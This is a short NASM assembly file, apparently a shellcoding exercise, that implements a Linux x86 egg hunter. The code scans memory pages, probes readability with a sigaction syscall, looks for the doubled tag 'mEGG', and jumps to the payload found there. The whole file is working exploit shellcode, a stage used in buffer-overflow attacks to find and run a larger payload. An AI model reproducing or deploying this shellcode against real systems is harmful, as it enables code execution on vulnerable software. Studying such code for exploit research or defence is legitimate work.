; EggHunter.nasm
; Author: Ravehorn

global _start

section .text

_align:

    or cx, 0xfff

_start:

    inc ecx
    push byte 0x43
    pop eax
    int 0x80
    cmp al, 0xf2
    jz _align
    mov eax, 0x4747456d ; mEGG
    mov edi, ecx
    scasd
    jnz _start
    scasd
    jnz _start
    jmp edi